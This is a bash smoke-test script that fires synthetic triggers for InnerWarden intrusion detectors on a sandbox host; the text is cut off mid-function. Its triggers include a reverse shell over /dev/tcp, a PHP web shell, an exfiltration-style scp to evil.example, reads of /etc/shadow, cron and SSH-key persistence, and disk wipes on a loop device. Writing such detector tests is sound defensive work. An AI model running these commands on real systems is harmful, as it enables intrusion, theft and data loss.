#!/usr/bin/env bash
# scripts/smoke-all.sh
#
# Local smoke test for every InnerWarden detector that can be triggered
# safely on a disposable host (test001 is the assumed target). Runs
# pre-Caldera so we know the sensor side fires correctly before adding
# the adversary-emulation noise.
#
# What it does:
#   1. Creates a disposable sandbox user, loop device, and scratch dir.
#   2. For each detector with a known synthetic trigger, executes the
#      trigger and polls /var/lib/innerwarden/incidents-*.jsonl for the
#      expected incident_id prefix.
#   3. Reports pass/fail/skip per detector with a summary at the end.
#   4. Tears down everything it created (loop device, user, dirs).
#
# Safe to run on test001. Will NOT touch real user data, real disks,
# real network beyond loopback, or anything outside the sandbox.
#
# Exit code: 0 if all expected detectors fired, 1 otherwise.

set -u

# ─── config ──────────────────────────────────────────────────────────
SANDBOX="/tmp/iw_smoke_sandbox"
LOOP_BACKING="/var/tmp/iw_smoke_loop.img"
TEST_USER="iw_smoke_test"
TEST_HOME="/home/${TEST_USER}"
INCIDENTS_DB="/var/lib/innerwarden/innerwarden.db"
WAIT_PER_DETECTOR=10  # seconds to wait for an incident after triggering
LOG="/tmp/iw_smoke_log_$(date +%s).log"

# ─── counters ────────────────────────────────────────────────────────
declare -A RESULTS  # detector_name → PASS/FAIL/SKIP
PASS=0
FAIL=0
SKIP=0

# ─── helpers ─────────────────────────────────────────────────────────
say()      { printf '%s  %s\n' "$(date +%H:%M:%S)" "$*"; }
header()   { printf '\n=== %s ===\n' "$*"; }
mark_pass(){ RESULTS["$1"]=PASS; PASS=$((PASS+1)); say "PASS $1"; }
mark_fail(){ RESULTS["$1"]=FAIL; FAIL=$((FAIL+1)); say "FAIL $1 — $2"; }
mark_skip(){ RESULTS["$1"]=SKIP; SKIP=$((SKIP+1)); say "SKIP $1 — $2"; }

# now_iso — UTC timestamp in the format used by the sensor's `ts` column.
now_iso() { date -u +'%Y-%m-%dT%H:%M:%S' ; }

# wait_for_incident <detector_id_prefix> [since_iso] [timeout_seconds]
# Polls the SQLite `incidents` table for a row whose incident_id begins
# with <detector_id_prefix>: AND whose ts is >= since_iso.
# If since_iso is omitted, defaults to the global $RUN_SINCE — captured
# at setup() — which avoids crediting stale incidents from prior runs.
wait_for_incident() {
  local prefix="$1"
  local since="${2:-$RUN_SINCE}"
  local timeout="${3:-$WAIT_PER_DETECTOR}"
  local start; start=$(date +%s)
  while [ $(($(date +%s) - start)) -lt "$timeout" ]; do
    local hit
    hit=$(sudo sqlite3 -readonly -bail "$INCIDENTS_DB" \
      "SELECT 1 FROM incidents WHERE ts >= '$since' AND incident_id LIKE '${prefix}:%' LIMIT 1;" 2>/dev/null)
    if [ "$hit" = "1" ]; then
      return 0
    fi
    sleep 1
  done
  return 1
}

# trigger <detector_name> [incident_prefix] <command...>
# Captures a per-test BEFORE_TS so wait_for_incident only credits
# incidents that fired AFTER the trigger ran. Required because the
# sensor accumulates incidents from past activity in the same DB.
trigger() {
  local name="$1"; shift
  local prefix="${1:-$name}"; shift || true
  local before; before=$(now_iso)
  say "→ trigger $name (since $before)"
  "$@" >/dev/null 2>&1 || true
  if wait_for_incident "$prefix" "$before"; then
    mark_pass "$name"
  else
    mark_fail "$name" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}

# ─── setup / teardown ────────────────────────────────────────────────
setup() {
  header "setup"
  # Lower bound on incident timestamps we will credit. Set BEFORE
  # any sandbox creation so incidents from the setup useradd are
  # captured for test_user_creation.
  RUN_SINCE=$(now_iso)
  say "RUN_SINCE = $RUN_SINCE"
  say "incidents DB: $INCIDENTS_DB"
  if [ ! -r "$INCIDENTS_DB" ] && ! sudo test -r "$INCIDENTS_DB"; then
    echo "FATAL: $INCIDENTS_DB not readable (even via sudo). Aborting."
    exit 2
  fi
  if ! command -v sqlite3 &>/dev/null; then
    echo "FATAL: sqlite3 client not installed — apt install sqlite3"
    exit 2
  fi

  say "scratch dir $SANDBOX"
  mkdir -p "$SANDBOX"
  echo "marker $(date +%s)" > "$SANDBOX/.marker"

  if ! id "$TEST_USER" &>/dev/null; then
    say "creating sandbox user $TEST_USER"
    sudo useradd -m -s /bin/bash "$TEST_USER"
  fi

  if [ ! -f "$LOOP_BACKING" ]; then
    say "creating loop backing file $LOOP_BACKING (100M sparse)"
    sudo truncate -s 100M "$LOOP_BACKING"
  fi
  if losetup -j "$LOOP_BACKING" 2>/dev/null | grep -q .; then
    LOOP_DEV=$(losetup -j "$LOOP_BACKING" | awk -F: '{print $1}')
  else
    LOOP_DEV=$(sudo losetup -f --show "$LOOP_BACKING")
  fi
  say "loop device: $LOOP_DEV"

  say "ensuring innerwarden services active"
  sudo systemctl is-active innerwarden-sensor >/dev/null \
    || sudo systemctl start innerwarden-sensor
  sudo systemctl is-active innerwarden-agent  >/dev/null \
    || sudo systemctl start innerwarden-agent

  # Let the sensor exec_context boot window pass (60s) so discovery_anomaly
  # doesn't silently classify our test as boot-time activity.
  local sensor_up_for
  sensor_up_for=$(systemctl show -p ActiveEnterTimestamp innerwarden-sensor \
                  | awk -F= '{print $2}' \
                  | xargs -I{} date -d{} +%s 2>/dev/null)
  local now; now=$(date +%s)
  if [ -n "$sensor_up_for" ] && [ $((now - sensor_up_for)) -lt 65 ]; then
    local wait=$((65 - (now - sensor_up_for)))
    say "sensor started <65s ago, sleeping ${wait}s for exec_context boot window"
    sleep "$wait"
  fi
}

teardown() {
  header "teardown"
  [ -n "${LOOP_DEV:-}" ] && sudo losetup -d "$LOOP_DEV" 2>/dev/null || true
  sudo rm -f "$LOOP_BACKING"
  sudo userdel -r "$TEST_USER" 2>/dev/null || true
  rm -rf "$SANDBOX"
  say "teardown done"
}

trap teardown EXIT

# ─── per-detector tests ──────────────────────────────────────────────
# Each test should be safe-by-design: triggers MUST not touch real
# user data, real disks (use $LOOP_DEV), or real network beyond
# loopback. Detectors fire on exec / file-write events, not on the
# *outcome* of those actions.

#### Discovery (spec 050-PR1) ####

test_nmap_scan() {
  local before; before=$(now_iso)
  say "→ trigger nmap_scan (as $TEST_USER, since $before)"
  sudo -u "$TEST_USER" bash -c 'exec -a /usr/bin/nmap /bin/true -sS -p 1-100 127.0.0.1' >/dev/null 2>&1 || true
  if wait_for_incident "nmap_scan" "$before"; then
    mark_pass "nmap_scan"
  else
    mark_fail "nmap_scan" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}
test_wordlist_scan() {
  local before; before=$(now_iso)
  say "→ trigger wordlist_scan (as $TEST_USER, since $before)"
  sudo -u "$TEST_USER" bash -c 'exec -a /usr/bin/gobuster /bin/true dir -u http://127.0.0.1 -w /tmp/iw_smoke_sandbox/.marker' >/dev/null 2>&1 || true
  if wait_for_incident "wordlist_scan" "$before"; then
    mark_pass "wordlist_scan"
  else
    mark_fail "wordlist_scan" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}
test_discovery_anomaly() {
  local before; before=$(now_iso)
  # Hit 3+ distinct discovery comms from the SAME uid (the sandbox
  # user, not root) so exec_context doesn't bucket as OpInteractive.
  sudo -u "$TEST_USER" bash -c 'exec -a /usr/bin/whoami /bin/true' >/dev/null 2>&1
  sudo -u "$TEST_USER" bash -c 'exec -a /usr/bin/id /bin/true' >/dev/null 2>&1
  sudo -u "$TEST_USER" bash -c 'exec -a /usr/bin/hostname /bin/true' >/dev/null 2>&1
  sudo -u "$TEST_USER" bash -c 'exec -a /usr/bin/uname /bin/true' >/dev/null 2>&1
  if wait_for_incident "discovery_anomaly" "$before"; then
    mark_pass "discovery_anomaly"
  else
    mark_fail "discovery_anomaly" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}

#### Collection (spec 050-PR2) ####

test_clipboard_read() {
  if ! command -v xclip &>/dev/null && ! command -v xsel &>/dev/null; then
    mark_skip "clipboard_read" "xclip/xsel not installed"
    return
  fi
  trigger "clipboard_read" "clipboard_read" \
    bash -c 'exec -a /usr/bin/xclip /bin/true -selection clipboard -o'
}
test_screen_capture() {
  trigger "screen_capture" "screen_capture" \
    bash -c 'exec -a /usr/bin/scrot /bin/true /tmp/iw_smoke_sandbox/shot.png'
}
test_archive_pwd_protected() {
  trigger "archive_pwd_protected" "archive_pwd_protected" \
    bash -c "exec -a /usr/bin/zip /bin/true -P attackerpass /tmp/iw_smoke_sandbox/loot.zip $SANDBOX/.marker"
}
test_automated_file_collection() {
  trigger "automated_file_collection" "automated_file_collection" \
    bash -c "exec -a /usr/bin/tar /bin/true -czf /tmp/iw_smoke_sandbox/loot.tgz /home/$TEST_USER"
}
test_keylogger_bash_trap() {
  # Two routes — pick the file.write_access route on the test user's .bashrc.
  echo "trap 'logger fake-trap' DEBUG" \
    | sudo tee -a "$TEST_HOME/.bashrc" >/dev/null
  if wait_for_incident "keylogger_bash_trap"; then
    mark_pass "keylogger_bash_trap"
  else
    mark_fail "keylogger_bash_trap" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}

#### C2 (spec 050-PR3) ####

test_c2_web_tunnel() {
  trigger "c2_web_tunnel" "c2_web_tunnel" \
    bash -c 'exec -a /usr/bin/ngrok /bin/true http 8080'
}
test_c2_protocol_tunneling() {
  trigger "c2_protocol_tunneling" "c2_protocol_tunneling" \
    bash -c 'exec -a /usr/bin/iodine /bin/true -f 127.0.0.1 example.com'
}
test_c2_non_standard_port() {
  # Bind a listener on a non-standard port via python http.server.
  python3 -m http.server 31337 --bind 127.0.0.1 >/dev/null 2>&1 &
  local py_pid=$!
  sleep 3
  if wait_for_incident "c2_non_standard_port"; then
    mark_pass "c2_non_standard_port"
  else
    mark_fail "c2_non_standard_port" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
  kill "$py_pid" 2>/dev/null || true
}

#### Privesc + Lateral (spec 050-PR4) ####

test_setuid_exploit_pattern() {
  # Drop a SUID binary in a non-baseline location and exec it as the
  # sandbox user. The detector fires on the suid=true event from eBPF.
  sudo cp /bin/true /tmp/iw_smoke_sandbox/customprivesc
  sudo chown root:root /tmp/iw_smoke_sandbox/customprivesc
  sudo chmod 4755 /tmp/iw_smoke_sandbox/customprivesc
  sudo -u "$TEST_USER" /tmp/iw_smoke_sandbox/customprivesc
  if wait_for_incident "setuid_exploit_pattern"; then
    mark_pass "setuid_exploit_pattern"
  else
    mark_fail "setuid_exploit_pattern" "needs eBPF suid metadata — verify sensor emitted suid=true"
  fi
}
test_capabilities_abuse() {
  sudo -u "$TEST_USER" sh -c 'cat /etc/shadow' >/dev/null 2>&1
  if wait_for_incident "capabilities_abuse"; then
    mark_pass "capabilities_abuse"
  else
    mark_fail "capabilities_abuse" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}
test_lateral_egress_ssh() {
  sudo -u "$TEST_USER" bash -c 'exec -a /usr/bin/ssh /bin/true attacker@8.8.8.8'
  if wait_for_incident "lateral_egress_ssh"; then
    mark_pass "lateral_egress_ssh"
  else
    mark_fail "lateral_egress_ssh" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}
test_lateral_egress_scp_rsync() {
  sudo -u "$TEST_USER" sh -c \
    "exec -a /usr/bin/scp /bin/true $TEST_HOME/.bashrc attacker@evil.example:/tmp/loot"
  if wait_for_incident "lateral_egress_scp_rsync"; then
    mark_pass "lateral_egress_scp_rsync"
  else
    mark_fail "lateral_egress_scp_rsync" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}

#### Persistence + Defense Evasion (spec 050-PR5) ####

test_pam_module_change() {
  echo "# smoke marker $(date +%s)" | sudo tee -a /etc/pam.d/sshd >/dev/null
  if wait_for_incident "pam_module_change"; then
    mark_pass "pam_module_change"
  else
    mark_fail "pam_module_change" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
  # restore
  sudo sed -i '/^# smoke marker/d' /etc/pam.d/sshd
}
test_auditd_disable() {
  if ! systemctl list-unit-files | grep -q '^auditd\.service'; then
    mark_skip "auditd_disable" "auditd not installed on this host"
    return
  fi
  sudo systemctl stop auditd
  if wait_for_incident "auditd_disable"; then
    mark_pass "auditd_disable"
  else
    mark_fail "auditd_disable" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
  sudo systemctl start auditd
}
test_selinux_apparmor_disable() {
  if command -v aa-status &>/dev/null && sudo aa-status &>/dev/null; then
    # AppArmor present — try aa-disable on a low-impact profile.
    local victim_profile
    victim_profile=$(sudo aa-status --enabled 2>/dev/null \
                     | grep -m1 '/usr/sbin/' | awk '{print $1}')
    if [ -n "$victim_profile" ]; then
      sudo aa-disable "$victim_profile" 2>/dev/null || true
      if wait_for_incident "selinux_apparmor_disable"; then
        mark_pass "selinux_apparmor_disable"
        # Restore the profile
        sudo aa-enforce "$victim_profile" 2>/dev/null || true
        return
      fi
      sudo aa-enforce "$victim_profile" 2>/dev/null || true
    fi
  fi
  # Fall back: just exec the binary (we just need an exec event of
  # `setenforce 0` — SELinux doesn't have to be active).
  bash -c 'exec -a /usr/sbin/setenforce /bin/true 0'
  if wait_for_incident "selinux_apparmor_disable"; then
    mark_pass "selinux_apparmor_disable"
  else
    mark_fail "selinux_apparmor_disable" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
}
test_startup_script_persistence() {
  echo "# smoke marker $(date +%s)" | sudo tee -a /etc/rc.local >/dev/null
  if wait_for_incident "startup_script_persistence"; then
    mark_pass "startup_script_persistence"
  else
    mark_fail "startup_script_persistence" "no incident within ${WAIT_PER_DETECTOR}s"
  fi
  sudo sed -i '/^# smoke marker/d' /etc/rc.local 2>/dev/null
}

#### Impact (spec 050-PR6) ####

test_rm_rf_user_data() {
  local before; before=$(now_iso)
  sudo mkdir -p "$TEST_HOME/loot_dir"
  sudo touch "$TEST_HOME/loot_dir/a" "$TEST_HOME/loot_dir/b"
  sudo rm -rf "$TEST_HOME/loot_dir"
  if wait_for_incident "data_destruction_pattern:rm_rf_user_data" "$before"; then
    mark_pass "data_destruction_pattern.rm_rf_user_data"
  else
    mark_fail "data_destruction_pattern.rm_rf_user_data" "no incident"
  fi
}
test_disk_wipe_loop() {
  local before; before=$(now_iso)
  sudo dd if=/dev/zero of="$LOOP_DEV" bs=1M count=1 2>/dev/null
  if wait_for_incident "data_destruction_pattern:disk_wipe" "$before"; then
    mark_pass "data_destruction_pattern.disk_wipe"
  else
    mark_fail "data_destruction_pattern.disk_wipe" "no incident (check argv carries of=$LOOP_DEV)"
  fi
}
test_shred_burst() {
  local before; before=$(now_iso)
  for n in 1 2 3 4; do
    echo data > "$SANDBOX/shred_$n.txt"
  done
  shred -u "$SANDBOX/shred_1.txt" "$SANDBOX/shred_2.txt" "$SANDBOX/shred_3.txt" "$SANDBOX/shred_4.txt"
  if wait_for_incident "data_destruction_pattern:shred_burst" "$before"; then
    mark_pass "data_destruction_pattern.shred_burst"
  else
    mark_fail "data_destruction_pattern.shred_burst" "no incident"
  fi
}
test_mkfs_loop() {
  local before; before=$(now_iso)
  sudo mkfs.ext4 -F "$LOOP_DEV" >/dev/null 2>&1
  if wait_for_incident "data_destruction_pattern:mkfs_on_running_volume" "$before"; then
    mark_pass "data_destruction_pattern.mkfs_on_running_volume"
  else
    mark_fail "data_destruction_pattern.mkfs_on_running_volume" "no incident"
  fi
}
test_luksformat_loop() {
  if ! command -v cryptsetup &>/dev/null; then
    mark_skip "data_destruction_pattern.cryptsetup_luksformat" "cryptsetup not installed"
    return
  fi
  local before; before=$(now_iso)
  echo -e "YES\nattackerpass\nattackerpass" \
    | sudo cryptsetup luksFormat "$LOOP_DEV" --batch-mode 2>/dev/null
  if wait_for_incident "data_destruction_pattern:cryptsetup_luksformat" "$before"; then
    mark_pass "data_destruction_pattern.cryptsetup_luksformat"
  else
    mark_fail "data_destruction_pattern.cryptsetup_luksformat" "no incident"
  fi
}

#### Legacy detectors — Initial Access ####

test_ssh_bruteforce() {
  # Synthetic auth.log lines simulating brute-force from a single IP.
  local fake_ip="198.51.100.99"
  for i in $(seq 1 12); do
    sudo bash -c "printf '%s test sshd[%d]: Failed password for root from %s port 50000 ssh2\n' \
      \"\$(date '+%b %e %H:%M:%S')\" \"\$\$\" '$fake_ip' >> /var/log/auth.log"
  done
  if wait_for_incident "ssh_bruteforce"; then
    mark_pass "ssh_bruteforce"
  else
    mark_fail "ssh_bruteforce" "no incident — verify auth_log collector is reading /var/log/auth.log"
  fi
}

test_credential_stuffing() {
  local fake_ip="198.51.100.100"
  for u in admin root oracle test ubuntu postgres redis www-data nobody guest; do
    sudo bash -c "printf '%s test sshd[%d]: Failed password for %s from %s port 50000 ssh2\n' \
      \"\$(date '+%b %e %H:%M:%S')\" \"\$\$\" '$u' '$fake_ip' >> /var/log/auth.log"
  done
  if wait_for_incident "credential_stuffing"; then
    mark_pass "credential_stuffing"
  else
    mark_fail "credential_stuffing" "no incident"
  fi
}

test_distributed_ssh() {
  for o in $(seq 1 12); do
    local ip="203.0.113.$o"
    sudo bash -c "printf '%s test sshd[%d]: Failed password for root from %s port 50000 ssh2\n' \
      \"\$(date '+%b %e %H:%M:%S')\" \"\$\$\" '$ip' >> /var/log/auth.log"
  done
  if wait_for_incident "distributed_ssh"; then
    mark_pass "distributed_ssh"
  else
    mark_fail "distributed_ssh" "no incident"
  fi
}

test_web_scan() {
  local nginx_log="/var/log/nginx/access.log"
  if [ ! -f "$nginx_log" ]; then
    mark_skip "web_scan" "no /var/log/nginx/access.log on this host"
    return
  fi
  local fake_ip="198.51.100.50"
  for path in /admin /wp-admin /.git /.env /phpmyadmin /xmlrpc.php /server-status /api/v1/users /backup /config.php; do
    sudo bash -c "printf '%s - - [%s] \"GET %s HTTP/1.1\" 404 162 \"-\" \"sqlmap/1.0\"\n' \
      '$fake_ip' \"\$(date '+%d/%b/%Y:%H:%M:%S %z')\" '$path' >> $nginx_log"
  done
  if wait_for_incident "web_scan"; then
    mark_pass "web_scan"
  else
    mark_fail "web_scan" "no incident"
  fi
}

test_user_agent_scanner() {
  local nginx_log="/var/log/nginx/access.log"
  if [ ! -f "$nginx_log" ]; then
    mark_skip "user_agent_scanner" "no /var/log/nginx/access.log on this host"
    return
  fi
  sudo bash -c "printf '%s - - [%s] \"GET / HTTP/1.1\" 200 162 \"-\" \"Nikto/2.1.6\"\n' \
    '198.51.100.51' \"\$(date '+%d/%b/%Y:%H:%M:%S %z')\" >> $nginx_log"
  sudo bash -c "printf '%s - - [%s] \"GET / HTTP/1.1\" 200 162 \"-\" \"sqlmap/1.0-dev\"\n' \
    '198.51.100.51' \"\$(date '+%d/%b/%Y:%H:%M:%S %z')\" >> $nginx_log"
  if wait_for_incident "user_agent_scanner"; then
    mark_pass "user_agent_scanner"
  else
    mark_fail "user_agent_scanner" "no incident"
  fi
}

test_web_shell() {
  # Plant a webshell-looking file in nginx's webroot (if any).
  local webroot="/var/www/html"
  if [ ! -d "$webroot" ]; then
    mark_skip "web_shell" "no /var/www/html webroot"
    return
  fi
  sudo bash -c "cat > $webroot/iw_smoke_shell.php <<'PHP'
<?php system(\$_GET['cmd']); ?>
PHP"
  if wait_for_incident "web_shell"; then
    mark_pass "web_shell"
  else
    mark_fail "web_shell" "no incident"
  fi
  sudo rm -f "$webroot/iw_smoke_shell.php"
}

#### Legacy detectors — Execution ####

test_reverse_shell() {
  # Start a TCP listener on 127.0.0.1:14444, then a bash reverse-shell
  # against it. The detector fires when a shell has socket FDs on
  # stdin/stdout/stderr.
  if ! command -v nc &>/dev/null; then
    mark_skip "reverse_shell" "nc not installed"
    return
  fi
  ( nc -l 127.0.0.1 14444 >/dev/null 2>&1 & echo $! >"$SANDBOX/nc.pid" )
  sleep 1
  ( bash -c 'bash -i >& /dev/tcp/127.0.0.1/14444 0>&1' & ) 2>/dev/null
  sleep 3
  kill "$(cat "$SANDBOX/nc.pid" 2>/dev/null)" 2>/dev/null || true
  pkill -f 'bash -i.*/dev/tcp/127.0.0.1' 2>/dev/null || true
  if wait_for_incident "reverse_shell"; then
    mark_pass "reverse_shell"
  else
    mark_fail "reverse_shell" "no incident"
  fi
}

test_fileless() {
  # memfd_create + execve from the fd. Use python ctypes to call the
  # syscall directly, write /bin/true bytes into it, then fexecve.
  if ! command -v python3 &>/dev/null; then
    mark_skip "fileless" "python3 not installed"
    return
  fi
  python3 - <<'PY' 2>/dev/null || true
import ctypes, os
libc = ctypes.CDLL('libc.so.6', use_errno=True)
SYS_memfd_create = 319  # x86_64
fd = libc.syscall(SYS_memfd_create, b'iw_smoke_fileless', 0)
if fd < 0:
    raise SystemExit(0)
with open('/bin/true', 'rb') as src:
    os.write(fd, src.read())
pid = os.fork()
if pid == 0:
    os.execv(f'/proc/self/fd/{fd}', ['iw_smoke_fileless'])
else:
    os.waitpid(pid, 0)
PY
  if wait_for_incident "fileless"; then
    mark_pass "fileless"
  else
    mark_fail "fileless" "no incident — verify eBPF memfd_create hook"
  fi
}

test_process_injection() {
  # mprotect a malloc'd region to RWX from python. The eBPF mprotect
  # tracepoint should emit, and the detector fires on RWX flag combo.
  if ! command -v python3 &>/dev/null; then
    mark_skip "process_injection" "python3 not installed"
    return
  fi
  python3 - <<'PY' 2>/dev/null || true
import ctypes
libc = ctypes.CDLL('libc.so.6', use_errno=True)
PROT_R, PROT_W, PROT_X = 1, 2, 4
size = 4096
buf = ctypes.c_void_p()
libc.posix_memalign(ctypes.byref(buf), 4096, size)
libc.mprotect(buf, size, PROT_R | PROT_W | PROT_X)
PY
  if wait_for_incident "process_injection"; then
    mark_pass "process_injection"
  else
    mark_fail "process_injection" "no incident — RWX mprotect should fire"
  fi
}

test_crypto_miner() {
  trigger "crypto_miner" "crypto_miner" \
    bash -c 'exec -a /usr/bin/xmrig /bin/true --donate-level=1 --url=pool.minexmr.com:443'
}

test_execution_guard() {
  # Whatever the host's allowlist marks as blocked. Use a plausibly-
  # weird argv0 that the agent might guard against.
  bash -c 'exec -a /usr/bin/nc /bin/true -e /bin/sh 127.0.0.1 4444' >/dev/null 2>&1
  if wait_for_incident "execution_guard"; then
    mark_pass "execution_guard"
  else
    mark_skip "execution_guard" "no exec block configured in allowlist"
  fi
}

#### Legacy detectors — Persistence ####

test_crontab_persistence() {
  echo "* * * * * root /tmp/iw_smoke_backdoor.sh # iw smoke" \
    | sudo tee -a /etc/crontab >/dev/null
  if wait_for_incident "crontab_persistence"; then
    mark_pass "crontab_persistence"
  else
    mark_fail "crontab_persistence" "no incident"
  fi
  sudo sed -i '/# iw smoke/d' /etc/crontab
}

test_systemd_persistence() {
  sudo bash -c "cat > /etc/systemd/system/iw_smoke_backdoor.service <<EOF
[Unit]
Description=IW smoke test fake persistence
[Service]
ExecStart=/bin/true
[Install]
WantedBy=multi-user.target
EOF"
  if wait_for_incident "systemd_persistence"; then
    mark_pass "systemd_persistence"
  else
    mark_fail "systemd_persistence" "no incident"
  fi
  sudo rm -f /etc/systemd/system/iw_smoke_backdoor.service
}

test_ssh_key_injection() {
  sudo mkdir -p "$TEST_HOME/.ssh"
  sudo bash -c "echo 'ssh-ed25519 AAAAfake iw_smoke_attacker' \
    >> $TEST_HOME/.ssh/authorized_keys"
  sudo chown -R "$TEST_USER:$TEST_USER" "$TEST_HOME/.ssh"
  if wait_for_incident "ssh_key_injection"; then
    mark_pass "ssh_key_injection"
  else
    mark_fail "ssh_key_injection" "no incident"
  fi
}

test_user_creation() {
  # The setup() useradd should have fired this. Wait up to 30s in case
  # the auth_log collector hasn't caught the journald entry yet.
  if wait_for_incident "user_creation" "$RUN_SINCE" 30; then
    mark_pass "user_creation"
  else
    mark_fail "user_creation" "setup useradd should have fired this within 30s"
  fi
}

#### Legacy detectors — Privilege Escalation ####

test_sudo_abuse() {
  # sudo to switch to the test user — abnormal target for unprivileged uid.
  sudo -u "$TEST_USER" sudo -n -u root true 2>/dev/null
  if wait_for_incident "sudo_abuse"; then
    mark_pass "sudo_abuse"
  else
    mark_skip "sudo_abuse" "may need NOPASSWD config"
  fi
}

test_privesc() {
  # Use commit_creds kprobe path — exec sudo and see if privilege.escalation event flows.
  sudo true
  if wait_for_incident "privesc"; then
    mark_pass "privesc"
  else
    mark_skip "privesc" "needs eBPF commit_creds kprobe + privesc detector wired"
  fi
}

#### Legacy detectors — Defense Evasion ####

test_log_tampering() {
  # Truncate a log file.
  sudo bash -c ': > /var/log/iw_smoke_fake.log'
  echo "previous content" | sudo tee /var/log/iw_smoke_fake.log >/dev/null
  sudo bash -c ': > /var/log/iw_smoke_fake.log'
  if wait_for_incident "log_tampering"; then
    mark_pass "log_tampering"
  else
    mark_skip "log_tampering" "fake log path not on watched list"
  fi
  sudo rm -f /var/log/iw_smoke_fake.log
}

test_data_encoding() {
  local before; before=$(now_iso)
  local blob; blob=$(base64 </etc/hostname 2>/dev/null | tr -d '\n' | head -c 200)
  sudo -u "$TEST_USER" bash -c "exec -a /usr/bin/echo /bin/true '$blob$blob$blob$blob'" >/dev/null 2>&1
  if wait_for_incident "data_encoding" "$before"; then
    mark_pass "data_encoding"
  else
    mark_fail "data_encoding" "no incident"
  fi
}

test_process_tree() {
  # Spawn a shell from a parent comm-stuffed binary so it looks like
  # nginx → sh (unexpected lineage).
  bash -c 'exec -a /usr/sbin/nginx /bin/bash -c "true"' &
  if wait_for_incident "process_tree"; then
    mark_pass "process_tree"
  else
    mark_skip "process_tree" "needs baseline of expected lineages"
  fi
}

test_yara_scan() {
  # Plant a binary in a watched path containing a YARA-rule signature
  # (we use the XMRig CLI string as the canonical marker).
  printf '\x7fELF iw_smoke_yara xmrig-cli pool.minexmr.com donate-level' \
    > "$SANDBOX/iw_smoke_xmrig"
  chmod +x "$SANDBOX/iw_smoke_xmrig"
  "$SANDBOX/iw_smoke_xmrig" >/dev/null 2>&1 || true
  if wait_for_incident "yara_scan"; then
    mark_pass "yara_scan"
  else
    mark_skip "yara_scan" "yara rules may not include XMRig string match"
  fi
}

test_sigma_rule() {
  # Sigma rules trigger on log lines. Force one via a sudoers edit pattern.
  sudo bash -c "echo '# iw smoke sigma marker' >> /etc/sudoers"
  if wait_for_incident "sigma_rule"; then
    mark_pass "sigma_rule"
  else
    mark_skip "sigma_rule" "built-in sigma rules may not match this exact pattern"
  fi
  sudo sed -i '/# iw smoke sigma marker/d' /etc/sudoers
}

#### Legacy detectors — Credential Access ####

test_credential_harvest() {
  sudo cat /etc/shadow >/dev/null
  if wait_for_incident "credential_harvest"; then
    mark_pass "credential_harvest"
  else
    mark_fail "credential_harvest" "no incident — verify file.read_access hook"
  fi
}

test_search_abuse() {
  sudo grep -r "password" /etc/ 2>/dev/null >/dev/null
  if wait_for_incident "search_abuse"; then
    mark_pass "search_abuse"
  else
    mark_skip "search_abuse" "threshold not met"
  fi
}

test_sensitive_write() {
  # Touch a sensitive file path. The detector fires on the write event.
  sudo bash -c "echo '# iw smoke marker' >> /etc/sudoers.d/iw_smoke"
  if wait_for_incident "sensitive_write"; then
    mark_pass "sensitive_write"
  else
    mark_skip "sensitive_write" "path may not be on watched list"
  fi
  sudo rm -f /etc/sudoers.d/iw_smoke
}

#### Legacy detectors — Discovery ####

test_port_scan() {
  if ! command -v nmap &>/dev/null; then
    mark_skip "port_scan" "nmap not installed"
    return
  fi
  nmap -p 1-200 127.0.0.1 >/dev/null 2>&1
  if wait_for_incident "port_scan"; then
    mark_pass "port_scan"
  else
    mark_skip "port_scan" "loopback may be excluded from detector"
  fi
}

test_discovery_burst() {
  local before; before=$(now_iso)
  for c in whoami id hostname uname uptime w pwd df free; do
    sudo -u "$TEST_USER" bash -c "exec -a /usr/bin/$c /bin/true"
  done
  if wait_for_incident "discovery_burst" "$before"; then
    mark_pass "discovery_burst"
  else
    mark_fail "discovery_burst" "no incident"
  fi
}

test_suspicious_login() {
  # Synthetic auth.log success line.
  sudo bash -c "printf '%s test sshd[%d]: Accepted password for root from 198.51.100.99 port 50000 ssh2\n' \
    \"\$(date '+%b %e %H:%M:%S')\" \"\$\$\" >> /var/log/auth.log"
  if wait_for_incident "suspicious_login"; then
    mark_pass "suspicious_login"
  else
    mark_skip "suspicious_login" "needs baseline of login-hour profile"
  fi
}

#### Legacy detectors — C2 + Exfil ####

test_dns_tunneling() {
  if ! command -v dig &>/dev/null; then
    mark_skip "dns_tunneling" "dig not installed"
    return
  fi
  for i in $(seq 1 20); do
    local longsub
    longsub=$(head -c 50 /dev/urandom | base64 | tr -d '+/=' | head -c 50)
    dig "+time=1" "+tries=1" "${longsub}.example.invalid" @127.0.0.53 >/dev/null 2>&1 || true
  done
  if wait_for_incident "dns_tunneling"; then
    mark_pass "dns_tunneling"
  else
    mark_skip "dns_tunneling" "dns_capture collector may not have CAP_NET_RAW"
  fi
}

test_dns_c2() {
  if ! command -v dig &>/dev/null; then
    mark_skip "dns_c2" "dig not installed"
    return
  fi
  for d in malware-c2.example.invalid attacker.evil.invalid kremlinrf.invalid; do
    dig "+time=1" "+tries=1" "$d" @127.0.0.53 >/dev/null 2>&1 || true
  done
  if wait_for_incident "dns_c2"; then
    mark_pass "dns_c2"
  else
    mark_skip "dns_c2" "needs domain to be in feed OR feed not loaded"
  fi
}

test_c2_callback() {
  # Outbound to a known-bad IP. Use a documentation range so we don't
  # accidentally hit a real host.
  curl --max-time 2 http://192.0.2.99/ >/dev/null 2>&1 || true
  if wait_for_incident "c2_callback"; then
    mark_pass "c2_callback"
  else
    mark_skip "c2_callback" "needs IP to be in malicious_ips feed"
  fi
}

test_outbound_anomaly() {
  curl --max-time 2 http://198.51.100.99:8080/ >/dev/null 2>&1 || true
  if wait_for_incident "outbound_anomaly"; then
    mark_pass "outbound_anomaly"
  else
    mark_skip "outbound_anomaly" "destination may be in baseline"
  fi
}

test_data_exfiltration() {
  # Push ~5MB to /dev/null via loopback POST. The detector fires on
  # size + dest heuristics.
  curl --max-time 5 -X POST -T <(head -c 5242880 /dev/urandom) \
    http://127.0.0.1/iw_smoke_exfil >/dev/null 2>&1 || true
  if wait_for_incident "data_exfiltration"; then
    mark_pass "data_exfiltration"
  else
